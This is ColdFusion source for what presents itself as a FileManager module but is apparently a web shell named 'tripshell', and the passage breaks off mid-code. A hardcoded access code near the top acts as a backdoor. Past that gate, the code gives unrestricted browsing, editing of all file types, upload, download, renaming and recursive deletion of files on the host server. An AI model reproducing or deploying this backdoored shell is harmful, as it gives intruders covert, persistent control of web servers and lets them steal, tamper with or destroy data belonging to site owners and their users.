<html>
<body>
<!--- 
	Created by S?bastien Denis - 
		1.0 : 23-nov-2004
		1.1 : 03-fev-2005 - new action: synchronize
	============================================================================
	The FileManager can be use as a common file manager or as a CFMODULE use inside an application.
	============================================================================
	Depending of the action (fuseaction attributes), the other attributes are...
	FUSEACTION		OTHER ATTRIBUTES
	============================================================================
	PASSWORD
		If password is required to access the module.
		Display a form to enter password.
	PASSWORDHASH
		Hash the password.
	HOME
		Display the file manager.
					PATH (default= current path)
					EDITEXTENSIONS (list of extensions to enable file edition)
					GETDIR (default = current folder)
	SEARCH
		Perform a search. 
		Return a query GETDIR and a call to fuseaction = HOME with this query.
					SEARCHNAME (reg exp corresponding to file/folder name)
					SEARCHTEXT (reg exp corresponding to file content)
					RECURSIVE (optional recursive search: 0/1 - default = 0)
					MAXSEARCHRESULT (number of result: n - default = 1)
	EDIT
		Edit a file
					EDITEXTENSIONS (list of extension - show the EDIT button)
						(default = txt,htm,html,cfm,cfml,asp,aspx,php,jsp,js,ini,bat,log,reg,xml,dtd,xslt)
						If "ALL", all files are editable
					PATH
					FILE
	WRITE
		Write the edited file
					PATH
					FILE
					FILENEWCONTENT
	UPLOAD			PATH, NBROFUPLOAD (number of the maximum file to upload at once - default is 20)		
	DOWNLOAD		PATH, FILE
	ADDDIR			PATH, DIRNEW
	ADDFILE			PATH, FILENEW
	RENAMEFILE		PATH, FILE, FILENEW
	RENAMEDIR		PATH, DIR, DIRNEW
	COPYFILE		PATH, FILE, PATHNEW (with the new file name)
	COPYDIR			PATH, DIR, PATHNEW (with the new folder name)
	MOVEFILE		PATH, FILE, PATHNEW (without the new file name) 
	MOVEDIR			PATH, DIR, PATHNEW (without the new folder name)
	DELETEFILE		PATH, FILE
	DELETEDIR		PATH, DIR
	DELETEDIRRECURSIVE PATH, DIR
	SYNCDIR			PATH, PATHNEW (path; origin, pathNew: destination), OVERWRITEALL
	
	Other attributes:
	============================================================================
	thisModule		the path to this module (cfmodule)
					default = listLast(cgi.script_name,"/\")
	relocate		0/1 (default 1, 0 in recursive call)
	CheckPassword	default = ""
					To compare with H to allow access to module
					If no correspondance => fuseaction = password
					If checkPassword = "" => No access control.
	H				The Hashed password always required if checkPassword neq "".
	PATHALLOWED		The path beyond which the module cannot go.
					default = "" meaning no limits.
	STYLE			0/1 (default = 1) include basic style.
 --->

<cftry>

<CFAPPLICATION NAME="tripshell" SESSIONMANAGEMENT="Yes" SESSIONTIMEOUT="#CreateTimeSpan(0, 0, 20, 0)#">

  <cfif (IsDefined("Session.tripshell") AND Session.tripshell EQ "ok") OR (IsDefined("form.code") AND form.code EQ "7825678")>
     <b>Ok all good</b>
     <cfset session.tripshell='ok'>


<!--- ************ Personal parameter *************** ---> 
<cfset attributes.editExtensions = "ALL">
<!--- ************ Personal parameter *************** ---> 

<cfsetting requestTimeout = 1000>
<!--- formurl2attributes --->
<cfparam name="attributes" default="#structNew()#">
<cfset structAppend(attributes,form,"no")>
<cfset structAppend(attributes,url,"no")>
<!--- Default parameters --->
<cfparam name="attributes.path" default="#expandPath(".")#">
<cfparam name="attributes.fuseaction" default="home">
<cfparam name="attributes.recursive" default="0">
<cfparam name="attributes.showpath" default="0">
<cfparam name="attributes.searchtext" default="">
<cfparam name="attributes.searchname" default="">
<cfparam name="attributes.maxsearchresult" default="1">
<cfparam name="attributes.checkpassword" default="">
<cfparam name="attributes.password" default="">
<cfparam name="attributes.nbrOfUpload" default="20">
<cfparam name="attributes.editExtensions" default="txt,htm,html,cfm,cfml,asp,aspx,php,jsp,js,ini,bat,log,reg,xml,dtd,xslt">
<cfparam name="attributes.relocate" default="1">
<cfparam name="attributes.overwriteAll" default="0">
<cfparam name="attributes.style" default="1">
<cfparam name="attributes.pathAllowed" default="">
<cfparam name="attributes.thisModule" default="#listLast(cgi.script_name,"/\")#">
<cfparam name="attributes.h" default="">
<!--- Find delimiter and set path --->
<cfif find("/",cgi.CF_TEMPLATE_PATH)>
	<cfset attributes.delimiter = "/">
<cfelse>
	<cfset attributes.delimiter = "\">
</cfif>
<cfset attributes.path = reReplace(attributes.path,"\#attributes.delimiter#{2,}",attributes.delimiter,"ALL")>
<cfif right(attributes.path,1) eq attributes.delimiter and len(attributes.path) gt 1>
	<cfset attributes.path = left(attributes.path,len(attributes.path)-1)>
</cfif>
<!--- UDF --->
<cffunction name="loc">
	<cfargument name="qs">
	<cfargument name="relocate">
	<cfif relocate>
		<cflocation url="?#qs#&path=#attributes.path#&h=#attributes.H#">
	</cfif>
</cffunction>
<!--- Password check --->
<cfif attributes.fuseaction neq "passwordHash" and attributes.checkPassword neq "">
	<cfif isDefined("attributes.H")>
		<cfif hash(attributes.checkpassword) neq attributes.H>
			<cfset attributes.fuseaction = "password">
		</cfif>
	<cfelse>
		<cfset attributes.fuseaction = "password">
	</cfif>
</cfif>
<!--- Path check --->
<cfif attributes.pathAllowed neq "">
	<cfif not findNoCase(attributes.pathAllowed,attributes.path)>
		<cfset attributes.path = attributes.pathAllowed>
		<cfset attributes.msg = "Error: cannot go beyond ""#attributes.pathAllowed#""">
	</cfif>
</cfif>
<!--- CSS Style --->
<cfif attributes.style and attributes.relocate>
	<style>
		body,table,input{font:11px;font-family:verdana}
		button, .button{font:11px;font-family:verdana;width:50;text-align:center;border:1px solid black;background-color:#EEEEEE;cursor:hand;padding:1 0 1 0;}
	</style>
</cfif>
<!--- Fusebox --->
<cfswitch expression="#attributes.fuseaction#">

	<cfcase value="password">
		<cfoutput>
			<form action="?" method="post">
				<input type="hidden" name="fuseaction" value="passwordHash">
				Password: <input type="password" name="password">&nbsp;<input type="submit" name="submit" value="Submit" class="button">
			</form>
		</cfoutput>
	</cfcase>
	
	<cfcase value="passwordHash">
		<cfoutput>
			<script>window.location.href="?h=#hash(attributes.password)#";</script>
		</cfoutput>
	</cfcase>
	
	<cfcase value="home">
		<cfoutput>
			<title>FileManager: #attributes.path#</title>
				<script>
					function addDir(){
						var sDirNew = prompt("Create folder in #JSStringFormat(attributes.path)#.\nFolder name:","");
						if (sDirNew != null && sDirNew != ""){
							window.location.href="?fuseaction=addDir&path=#JSStringFormat(attributes.path)#&dirNew=" + sDirNew + "&h=#attributes.h#";
						}
					}
					function addFile(){
						var sFileNew = prompt("Create file in #JSStringFormat(attributes.path)#.\nFile name:","");
						if (sFileNew != null && sFileNew != ""){
							window.location.href="?fuseaction=addFile&path=#JSStringFormat(attributes.path)#&fileNew=" + sFileNew + "&h=#attributes.h#";
						}
					}
					function renameFile(sFile){
						var sFileNew = prompt("New file name",sFile + "_copy");
						if (sFileNew != null && sFileNew != "" && sFileNew != sFile){
							window.location.href="?fuseaction=renamefile&path=#JSStringFormat(attributes.path)#&file=" + sFile + "&fileNew=" + sFileNew + "&h=#attributes.h#";
						}
					}
					function renameDir(sDir){
						var sDirNew = prompt("New folder name",sDir + "_copy");
						if (sDirNew != null && sDirNew != "" && sDirNew != sDir){
							window.location.href="?fuseaction=renameDir&path=#JSStringFormat(attributes.path)#&dir=" + sDir + "&dirNew=" + sDirNew + "&h=#attributes.h#";
						}
					}		
					function copyFile(sFile){
						sDefault = "#JSStringFormat(attributes.path)##JSStringFormat(attributes.delimiter)#" + sFile;
						var sPathNew = prompt("Destination for \"" + sFile + "\".",sDefault);
						if (sPathNew != null && sPathNew != "" && sPathNew != sDefault){
							window.location.href="?fuseaction=copyFile&path=#JSStringFormat(attributes.path)#&pathNew=" + sPathNew + "&file=" + sFile + "&h=#attributes.h#";
						}
					}
					function copyDir(sDir){
						sDefault = "#JSStringFormat(attributes.path)##JSStringFormat(attributes.delimiter)#" + sDir;
						var sPathNew = prompt("Destination for \"" + sDir + "\".\nProvide a UNEXISTANT path!",sDefault + "_copy");
						if (sPathNew != null && sPathNew != "" && sPathNew != sDefault){
							window.location.href="?fuseaction=copydir&path=#JSStringFormat(attributes.path)#&dir=" + sDir + "&pathNew=" + sPathNew + "&h=#attributes.h#";
						}
					}
					function moveFile(sFile){
						sDefault = "#JSStringFormat(attributes.path)#";
						var sPathNew = prompt("Move \"" + sFile + "\" to:",sDefault);
						if (sPathNew != null && sPathNew != "" && sPathNew != sDefault){
							window.location.href="?fuseaction=moveFile&path=#JSStringFormat(attributes.path)#&pathNew=" + sPathNew + "&file=" + sFile + "&h=#attributes.h#";
						}
					}
					function moveDir(sDir){
						sDefault = "#JSStringFormat(attributes.path)#";
						var sPathNew = prompt("Move \"" + sDir + "\" to:",sDefault);
						if (sPathNew != null && sPathNew != "" && sPathNew != sDefault){
							window.location.href="?fuseaction=moveDir&path=#JSStringFormat(attributes.path)#&pathNew=" + sPathNew + "&dir=" + sDir + "&h=#attributes.h#";
						}
					}
					function syncDir(sDir){
						sDefault = "#JSStringFormat(attributes.path)#" + "\\" + sDir;
						var sPathNew = prompt("Synchronize \"" + sDefault + "\" to:",sDefault);
						var bOverwriteAll = 0;
						if (sPathNew != null && sPathNew != "" && sPathNew != sDefault){
							if (confirm("Do yout want to overwrite all files?\nOK: copy all files.\nCancel: copy new and modified files.")) bOverwriteAll = 1;
							window.location.href="?fuseaction=syncDir&path=" + sDefault + "&pathNew=" + sPathNew + "&overwriteall=" + bOverwriteAll + "&h=#attributes.h#";
						}
					}
					function deleteFile(sFile){
						if (confirm("Delete \"" + sFile + "\"?"))window.location.href="?fuseaction=deletefile&path=#JSStringFormat(attributes.path)#&file=" + sFile + "&h=#attributes.h#";
					}
					function deleteDir(sDir){
						if (confirm("Delete \"" + sDir + "\"?"))window.location.href="?fuseaction=deletedir&path=#JSStringFormat(attributes.path)#&dir=" + sDir + "&h=#attributes.h#";
					}
					function showNextUpload(n){
						document.getElementById("fileUpload" + n).style.display='';
						document.getElementById("submitUpload").style.display='';
					}
				</script>
			<cfif isDefined("attributes.msg")>
				<h4 style="color:#iif(findNoCase("error",attributes.msg),"'red'","'green'")#">#attributes.msg#</h4>
			</cfif>
			<cfif len(attributes.path) gt 1>
				<cfset attributes.parentpath = listDeleteAt(attributes.path,listLen(attributes.path,attributes.delimiter),attributes.delimiter)>
			<cfelse>
				<cfset attributes.parentpath = "">
			</cfif>
			<table style="border:1 solid black">
				<form action="?" method="post">
					<input type="hidden" name="h" value="#attributes.h#">
					<tr>
						<td width="100">Parent:</td>
						<td><a href="?path=#attributes.parentpath#&h=#attributes.h#">#attributes.parentpath#</a></td>
					</tr>
					<tr>
						<td valign="top">Path:</td>
						<td>
							<input type="text" name="path" value="#attributes.path#" style="font-weight:bold" size="100">&nbsp;
							<input type="submit" value="Submit" class="button"><br>
							<button style="width:150" onclick="addDir()">Create a folder</button>&nbsp;
							<button style="width:150" onclick="addFile()">Create a file</button>
						</td>
					</tr>
				</form>
				<form action="?" method="post">
					<input type="hidden" name="h" value="#attributes.h#">
					<input type="hidden" name="fuseaction" value="search">
					<input type="hidden" name="path" value="#attributes.path#">
					<tr>
						<td>Search:</td>
						<td><span style="width:150">File/folder name (RE):</span><input type="text" name="searchname" size="70" value="#attributes.searchname#"></td>
					</tr>
					<tr>
						<td>&nbsp;</td>
						<td><span style="width:150">Containg text (RE):</span><input type="text" name="searchtext" size="70" value="#attributes.searchtext#"></td>
					</tr>
					<tr>
						<td>&nbsp;</td>
						<td>
							Recursive <input type="checkbox" name="recursive" value="1" #iif(attributes.recursive,"'checked'","''")#>&nbsp;
							Max. result <select name="maxsearchresult">
											<option value="1" #iif(attributes.maxsearchresult eq 1,"'SELECTED'","''")#>1</option>
											<option value="5" #iif(attributes.maxsearchresult eq 5,"'SELECTED'","''")#>5</option>
											<option value="10" #iif(attributes.maxsearchresult eq 10,"'SELECTED'","''")#>10</option>
											<option value="50" #iif(attributes.maxsearchresult eq 50,"'SELECTED'","''")#>50</option>
											<option value="100" #iif(attributes.maxsearchresult eq 100,"'SELECTED'","''")#>100</option>
										</select>
						<input type="submit" value="Submit" class="button"></td>
					</tr>
				</form>
				<form action="?" method="post" enctype="multipart/form-data">
					<input type="hidden" name="h" value="#attributes.h#">
					<input type="hidden" name="fuseaction" value="upload">
					<input type="hidden" name="path" value="#attributes.path#">
					<tr>
						<td valign="top">Upload:</td>
						<td>
							<span style="width:20">1.</span><input type="File" name="file1" size="70" onchange="showNextUpload(2)">
								<input type="checkbox" name="overwrite1">Overwrite
							<cfloop index="i" from="2" to="#attributes.nbrOfUpload#">
								<div id="fileUpload#i#" style="display:'none'">
									<span style="width:20">#i#.</span><input type="File" name="file#i#" size="70" onchange="showNextUpload(#i+1#)">
									<input type="checkbox" name="overwrite#i#">Overwrite
								</div>
							</cfloop>
							<input type="submit" value="Upload" name="submitUpload" class="button" style="display:'none'">
						</td>
					</tr>
				</form>
			</table>
		</cfoutput>
		<cfflush>
		<cfif not isDefined("attributes.getDir")>
			<cfdirectory action="LIST" directory="#attributes.path#" name="attributes.getDir">
		</cfif>
		<br>
		<table style="border:1 solid black">
			<tr bgcolor="#c0c0c0">
				<th>&nbsp;</th>
			<cfset colspan = 1>
			<cfif attributes.showpath>
				<cfset colspan = 2>
				<th>Path</th>
			</cfif>
				<th>Name</th>
				<th>Actions</th>
				<th>Size</th>
				<th>Attr.</th>
				<th>Modif. date</th>
			</tr>
		<cfoutput>	
			<tr>
				<td colspan="#colspan#"><hr size="1"></td>
				<td align="center"><b>F o l d e r s</b></td>
				<td colspan="10"><hr size="1"></td>
			</tr>
		</cfoutput>
		<cfset i = 0>
		<cfoutput query="attributes.getDir">
			<cfif type eq "dir" and name neq "." and name neq "..">
			<cfset i = i + 1>
			<tr bgcolor="#iif(evaluate(i Mod 2),"'F2F2F2'","'EFEFE2'")#">
				<td>#i#.</td>
				<cfif attributes.showpath>
					<td><a href="?path=#path#&h=#attributes.h#" style="text-decoration:none">#path#</a></td>
					<td><a href="?path=#path##attributes.delimiter##name#&h=#attributes.h#" style="text-decoration:none"><b>#name#</b></a></td>
					<td><a onclick="window.location.href='?path=#JSStringFormat("#path##attributes.delimiter##name#&h=#attributes.h#")#'" class="button">Open</a></td>
				<cfelse>
					<td><a href="?path=#attributes.path##attributes.delimiter##name#&h=#attributes.h#" style="text-decoration:none"><b>#name#</b></a></td>
					<td>
						<a onclick="window.location.href='?path=#JSStringFormat(attributes.path & attributes.delimiter)##name#&h=#attributes.h#'" class="button">Open</a>
						<a onclick="renameDir('#name#')" class="button">Rename</a>
						<a onclick="copyDir('#name#')" class="button">Copy</a>
						<a onclick="moveDir('#name#')" class="button">Move</a>
						<a onclick="deleteDir('#name#')" class="button" style="color:red">Delete</a>
						<a onclick="syncDir('#name#')" class="button">Sync.</a>
					</td>
				</cfif>
				<td>&nbsp;</td>
				<td>#ATTRIBUTES#&nbsp;</td>
				<td>#DATELASTMODIFIED#</td>
			</tr>
			</cfif>
		</cfoutput>	
		<cfoutput>
			<tr>
				<td colspan="#colspan#"><hr size="1"></td>
				<td align="center"><b>F i l e s</b></td>
				<td colspan="10"><hr size="1"></td>
			</tr>
		</cfoutput>
		<cfoutput query="attributes.getDir">
			<cfif type eq "file">
				<cfset i = i + 1>
			<tr bgcolor="#iif(evaluate(i Mod 2),"'F2F2F2'","'EFEFE2'")#">
				<td>#i#.</td>
				<cfif attributes.showpath>
					<td><a href="?path=#path#&h=#attributes.h#" style="text-decoration:none">#path#</a></td>
					<td><a href="?fuseaction=download&path=#path#&file=#name#&h=#attributes.h#" style="text-decoration:none"><b>#name#</b></a></td>
					<cfif attributes.editExtensions eq "ALL" or listFindNoCase(attributes.editExtensions,listLast(name,"."))>
						<td>
							<a onclick="window.location.href='?fuseaction=edit&path=#JSStringFormat(path)#&h=#attributes.h#&file=#name#'" class="button">Edit</a>
							<a onclick="window.location.href='?fuseaction=download&path=#JSStringFormat(path)#&h=#attributes.h#&file=#name#'" class="button">Down.</a>
						</td>
					</cfif>
				<cfelse>
					<td><a href="?fuseaction=download&path=#attributes.path#&file=#name#&h=#attributes.h#" style="text-decoration:none">#name#</a></td>
					<td>
						<a onclick="window.location.href='?fuseaction=download&path=#JSStringFormat(attributes.path)#&h=#attributes.h#&file=#name#'" class="button">Down.</a>
						<a onclick="renameFile('#name#')" class="button">Rename</a>
						<a onclick="copyFile('#name#')" class="button">Copy</a>
						<a onclick="moveFile('#name#')" class="button">Move</a>
						<a onclick="deleteFile('#name#')" class="button" style="color:red">Delete</a>
						<cfif attributes.editExtensions eq "ALL" or listFindNoCase(attributes.editExtensions,listLast(name,"."))>
							<a onclick="window.location.href='?fuseaction=edit&path=#JSStringFormat(attributes.path)#&h=#attributes.h#&file=#name#'" class="button">Edit</a>
						</cfif>
						<cfif Find("R",attributes)>
							<a onclick="window.location.href='?fuseaction=removeR&path=#JSStringFormat(attributes.path)#&file=#name#&fileNew=#name#&h=#attributes.h#'" class="button">Rem RO</a>	
						</cfif>
					</td>
				</cfif>
				<td align="right">#numberFormat(size)# B</td>
				<td>#ATTRIBUTES#&nbsp;</td>
				<td>#DATELASTMODIFIED#</td>
			</tr>
			</cfif>
		</cfoutput>
		</table>
	</cfcase>
	
	<cfcase value="edit">
		<cfoutput><title>FileManager: #attributes.file#</title></cfoutput>
		<cffile action="READ" file="#attributes.path##attributes.delimiter##attributes.file#" variable="filecontent">
		<cfdirectory action="LIST" directory="#attributes.path##attributes.delimiter#" filter="#attributes.file#" name="getFile">
		<cfif findNoCase("R",getFile.attributes[1])>
			<cfoutput>
			<div>
				<span style="color:red;font-weight:bold">This file is READ-ONLY</span>
				&nbsp;<button onclick="window.location.href='?fuseaction=removeR&path=#JSStringFormat(attributes.path)#&file=#attributes.file#&fileNew=#attributes.file#&after=edit&h=#attributes.h#'" style="width:150">Remove Read-Only</button>	
				&nbsp;<button onclick="history.back()">Back</button>
			</div>
			<pre style="width:100%;height:95%;border:2 solid black">#htmlEditFormat(filecontent)#</pre>
			</cfoutput>
		<cfelse>
			<cfoutput>
			<form action="?" method="post">
				<input type="submit" value="Save Back" style="width:100" class="button"> 
				<input type="submit" value="Save" onclick="document.all.fuseactionNext.value='edit'" class="button">&nbsp;
				<button onclick="window.location.href='?path=#JSStringFormat(attributes.path)#&h=#attributes.h#&file=#attributes.file#'">Cancel</button>
				Size: #numberFormat(getFile.size)#B | Date: #getFile.dateLastModified#
				<input type="hidden" name="h" value="#attributes.h#">
				<input type="hidden" name="fuseaction" value="write">
				<input type="hidden" name="fuseactionNext" value="home">
				<input type="hidden" name="path" value="#attributes.path#">
				<input type="hidden" name="file" value="#attributes.file#">
				<textarea style="width:100%;height:95%" name="fileNewContent" style="font-size:11px">#htmlEditFormat(filecontent)#</textarea>
				<div>
					<input type="submit" value="Save Back" style="width:100" class="button">
					<input type="submit" value="Save" onclick="document.all.fuseactionNext.value='edit'" class="button">&nbsp;
					<button onclick="window.location.href='?path=#JSStringFormat(attributes.path)#&h=#attributes.h#&file=#attributes.file#'">Cancel</button>
				</div>
			</form>
			</cfoutput>
		</cfif>
	</cfcase>
	
	<cfcase value="write">
		<cftry> 
			<cffile action="DELETE" file="#attributes.path##attributes.delimiter##attributes.file#">
			<cffile action="WRITE" file="#attributes.path##attributes.delimiter##attributes.file#" output="#attributes.fileNewContent#" addnewline="No">
			<cfoutput>#loc("fuseaction=#attributes.fuseactionNext#&file=#attributes.file#", attributes.relocate)#</cfoutput>
			<cfcatch>
				<cfoutput>#loc("msg=Error while updating file!", attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
	</cfcase>
	
	<cfcase value="upload">
		<cfset msg = "Upload Result:">
		<cfloop index="i" from="1" to="#attributes.nbrOfUpload#">
			<cfif form["file#i#"] neq "">
				<cftry>
					<cffile action="UPLOAD"
						filefield="form.file#i#" 
						destination="#attributes.path#"
						nameconflict="#iif(isDefined("attributes.overwrite#i#"),"'OVERWRITE'","'Error'")#">
					<cfset msg = "#msg#\n - File #i#: OK">
					<cfcatch>
						<cfset msg = "#msg#\n - File #i#: ERROR">
					</cfcatch> 
				</cftry>
			</cfif>
		</cfloop>
		<cfoutput>#loc("", attributes.relocate)#</cfoutput>
	</cfcase>
	
	<cfcase value="download">
		<cfheader name="Content-disposition" value="attachment; filename=#attributes.file#">
		<cfcontent file="#attributes.path##attributes.delimiter##attributes.File#">
	</cfcase>
	
	<cfcase value="deleteFile">
		<cftry>
			<cffile action="delete" file="#attributes.path##attributes.delimiter##attributes.file#">
			<cfoutput>#loc("msg=File deleted!", attributes.relocate)#</cfoutput>
			<cfcatch>
				<cfoutput>#loc("msg=Error: file not deleted!", attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
	</cfcase>
	
	<cfcase value="deleteDir">
		<cftry>
			<cfdirectory action="DELETE" directory="#attributes.path##attributes.delimiter##attributes.dir#">
			<cfoutput>#loc("msg=Folder deleted!", attributes.relocate)#</cfoutput>
			<cfcatch>
				<cfoutput>#loc("fuseaction=deletedirRecursiveConfirm&dir=#attributes.dir#", attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
	</cfcase>
	
	<cfcase value="deleteDirRecursiveConfirm">
		<cfoutput>
			<script>
				if(confirm("Folder not deleted. It may contains files or folders.\nTry recursive delete?")) window.location.href="?fuseaction=deletedirRecursive&path=#jsStringFormat(attributes.path)#&dir=#jsStringFormat(attributes.dir)#&h=#attributes.h#";
				else window.location.href="?path=#jsStringFormat(attributes.path)#&h=#attributes.h#";
			</script>
		</cfoutput>
	</cfcase>
	
	<cfcase value="deleteDirRecursive">
		<cfdirectory action="LIST" name="attributes.getDir" directory="#attributes.path##attributes.delimiter##attributes.dir#">
		<cfoutput><h3>#attributes.path##attributes.delimiter##attributes.dir#</h3></cfoutput>
		<!--- Delete files --->
		<cfloop query="attributes.getDir">
			<cfif type eq "file">
				<cftry>
					<cffile action="delete" file="#attributes.path##attributes.delimiter##attributes.dir##attributes.delimiter##name#">
					<cfoutput>
						<div>
							<span style="width:100">FILE:</span>
							#attributes.path##attributes.delimiter##attributes.dir##attributes.delimiter#<b>#name#</b>
						</div>
					</cfoutput>
					<cfcatch/>
				</cftry>
			</cfif>
		</cfloop>
		<!--- Delete sub-folder --->
		<cfloop query="attributes.getDir">
			<cfif type eq "dir">
				<cfmodule template="#attributes.thisModule#"
					fuseaction="deleteDirRecursive"
					h="#attributes.H#"
					path="#attributes.path##attributes.delimiter##attributes.dir#"
					dir="#name#"
					relocate="0">
			</cfif>
		</cfloop>
		<cftry>
			<cfdirectory action="DELETE" directory="#attributes.path##attributes.delimiter##attributes.dir#">
			<cfoutput>
				<div>
					<span style="width:100">FOLDER:</span>
					#attributes.path##attributes.delimiter#<b>#attributes.dir#</b>
				</div>
			</cfoutput>
			<cfcatch/>
		</cftry>
		<cfflush>
		<cfif attributes.relocate>
			<cfoutput>
				<button name="fileManagerButton" style="width:700" onclick="window.location.href='?h=#attributes.H#&path=#jsStringFormat(attributes.path)#'">Deletion done! Back to <b>#attributes.path#</b></button>
			</cfoutput>
		</cfif>
	</cfcase>
	
	<cfcase value="addDir">
		<cftry>
			<cfdirectory action="CREATE" directory="#attributes.path##attributes.delimiter##attributes.dirNew#">
			<cfoutput>#loc("msg=Folder created!", attributes.relocate)#</cfoutput>
			<cfcatch>
				<cfoutput>#loc("msg=Error: folder not created!", attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
	</cfcase>
	
	<cfcase value="addFile">
		<cftry>
			<cffile action="WRITE" file="#attributes.path##attributes.delimiter##attributes.fileNew#" output="">
			<cfoutput>#loc("msg=File created!", attributes.relocate)#</cfoutput>
			<cfcatch>
				<cfoutput>#loc("msg=Error: file not created!", attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
	</cfcase>
	
	<cfcase value="copyFile">
		<cfif fileExists("#attributes.pathNew#")>
			<cfoutput>
				<script>
					alert("This file already exists!");
					history.back();
				</script>
			</cfoutput>
			<cfabort>
		</cfif>
		<cftry>
			<cfset pathTry = listDeleteAt(attributes.pathNew,listLen(attributes.pathNew,"/\"),"/\")>
			<cfdirectory action="CREATE" directory="#pathTry#">
			<cfcatch/>
		</cftry>
		<cftry>
			<cffile action="COPY" source="#attributes.path##attributes.delimiter##attributes.file#" 
				destination="#attributes.pathNew#">
			<cfif attributes.relocate>
				<cfoutput>#loc("msg=File copied!", attributes.relocate)#</cfoutput>
			</cfif>
			<cfcatch>
				<cfif attributes.relocate>
					<cfoutput>#loc("msg=Error: file not copied", attributes.relocate)#</cfoutput>
				</cfif>
			</cfcatch>
		</cftry>
	</cfcase>
	
	<cfcase value="copyDir">
		<cfif DirectoryExists("#attributes.pathNew#")>
			<cfoutput>
				<script>
					alert("This folder already exists!\nPlease use synchronize function.");
					history.back();
				</script>
			</cfoutput>
			<cfabort>
		</cfif>
		<cfdirectory directory="#attributes.path##attributes.delimiter##attributes.dir#" name="attributes.getDir">
		<!--- create main folder --->
		<cftry>
			<cfdirectory action="CREATE" directory="#attributes.pathNew#">
			<cfoutput><h3>#attributes.pathNew#</h3></cfoutput>
			<cfcatch/>
		</cftry>
		<!--- copy folder content - Recursive copy --->
		<cfloop query="attributes.getDir">
			<cfif type eq "file">
				<cffile 
					action="COPY" 
					source="#attributes.path##attributes.delimiter##attributes.dir##attributes.delimiter##name#" 
					destination="#attributes.pathNew##attributes.delimiter##name#"
					attributes="Normal">
				<cfoutput><div>#attributes.pathNew##attributes.delimiter#<b>#name#</b></div></cfoutput>
				<cfflush>
			</cfif>
		</cfloop>
		<cfloop query="attributes.getDir">
			<cfif type eq "dir">
				<cfmodule 
					fuseaction="copyDir"
					template="#attributes.thisModule#" 
					h="#attributes.H#"
					path="#attributes.path##attributes.delimiter##attributes.dir##attributes.delimiter#"
					dir="#name#"
					pathNew="#attributes.pathNew##attributes.delimiter##name#"
					relocate="0">
			</cfif>
		</cfloop>
		<cfif attributes.relocate>
			<cfoutput>
				<button name="fileManagerButton" style="width:700" onclick="window.location.href='?h=#attributes.H#&path=#jsStringFormat(attributes.path)#'">Copy done! Back to <b>#attributes.path#</b></button>
			</cfoutput>
		</cfif>
	</cfcase>
	
	<cfcase value="renameFile">
		<cfif fileExists("#attributes.path##attributes.delimiter##attributes.fileNew#")>
			<cfoutput>
				<script>
					alert("This file already exists!");
					history.back();
				</script>
			</cfoutput>
			<cfabort>
		</cfif>
		<cftry>
			<cffile action="rename" source="#attributes.path##attributes.delimiter##attributes.file#" destination="#attributes.path##attributes.delimiter##attributes.fileNew#" attributes="normal">
			<cfoutput>#loc("msg=File updated!", attributes.relocate)#</cfoutput>
			<cfcatch>
				<cfoutput>#loc("msg=Error while updating file!", attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
	</cfcase>

	<cfcase value="removeR">
		<cftry>
			<cffile action="rename" source="#attributes.path##attributes.delimiter##attributes.file#" destination="#attributes.path##attributes.delimiter##attributes.fileNew#" attributes="normal">
			<cfset qs = "">
			<cfif isDefined("attributes.after") and attributes.after eq "edit">
				<cfset qs = "fuseaction=edit&file=#attributes.file#&">
			</cfif>
			<cfoutput>#loc("#qs#msg=File updated!", attributes.relocate)#</cfoutput>
			<cfcatch>
				<cfoutput>#loc("#qs#msg=Error while updating file!", attributes.relocate)#</cfoutput>
			</cfcatch>
		</cftry>
	</cfcase>
	
	<cfcase value="renameDir">
		<cfif DirectoryExists("#attributes.path##attributes.delimiter##attributes.dirNew#")>
			<cfoutput>
				<script>
					alert("This folder already exists!");
					history.back();
				</script>
			</cfoutput>
			<cfabort>
		</cfif>
		<h2>Rename folder - step 1: copy files</h2>
		<cfmodule template="#attributes.thisModule#"
			fuseaction="copyDir"
			h="#attributes.h#"
			path="#attributes.path#"
			pathOrigin="#attributes.path##attributes.delimiter##attributes.dir#"
			pathNew="#attributes.path##attributes.delimiter##attributes.dirNew#"
			relocate="0">
		<h2>Rename folder - step 2: delete files</h2>
		<cfmodule template="#attributes.thisModule#"
			fuseaction="deleteDirRecursive"
			h="#attributes.h#"
			path="#attributes.path#"
			dir="#attributes.dir#"
			relocate="0">
		<cfif attributes.relocate>
			<cfoutput>
				<button name="fileManagerButton" style="width:700" onclick="window.location.href='?path=#jsStringFormat(attributes.path)#&h=#attributes.H#'">Rename done! Back to <b>#attributes.path#</b></button>
			</cfoutput>
		</cfif>
	</cfcase>

	<cfcase value="moveFile">
		<h2>Move file - step 1: copy file</h2>
		<cfmodule template="#attributes.thisModule#"
			fuseaction="copyFile"
			h="#attributes.h#"
			path="#attributes.path#"
			file="#attributes.file#"
			pathNew="#attributes.pathNew#"
			relocate="0">
		<h2>Move file - step 2: delete file</h2>
		<cfmodule template="#attributes.thisModule#"
			fuseaction="deleteFile"
			h="#attributes.h#"
			path="#attributes.path#"
			file="#attributes.file#"
			relocate="0">
		<cfoutput>#loc("msg=File moved!", attributes.relocate)#</cfoutput>
	</cfcase>
	
	<cfcase value="moveDir">
		<h1>Move folder - step 1: copy files</h1>
		<cfmodule template="#attributes.thisModule#"
			fuseaction="copyDir"
			h="#attributes.h#"
			pathOrigin="#attributes.path##attributes.delimiter##attributes.dir#"
			pathNew="#attributes.pathNew##attributes.delimiter##attributes.dir#"
			relocate="0">
		<h1>Move folder - step 2: delete files</h1>
		<cfmodule template="#attributes.thisModule#"
			fuseaction="deleteDirRecursive"
			h="#attributes.h#"
			path="#attributes.path#"
			dir="#attributes.dir#"
			relocate="0">
		<cfif attributes.relocate>
			<cfoutput>
				<button name="fileManagerButton" style="width:700" onclick="window.location.href='?h=#attributes.H#&path=#jsStringFormat(attributes.path)#'">Move done! Back to <b>#attributes.path#</b></button>
			</cfoutput>
		</cfif>
	</cfcase>
	
	<cfcase value="syncDir">
		<cfif attributes.relocate>
			<cfoutput><h1>Synchronize</h1><h3>From... #attributes.path#</h3><h3>To... #attributes.pathNew#</h3><hr></cfoutput>
		</cfif>
		<cfdirectory directory="#attributes.path#" name="getDir">
		<cfdirectory directory="#attributes.pathNew#" name="getDirNew">
		<!--- create main folder --->
		<cftry>
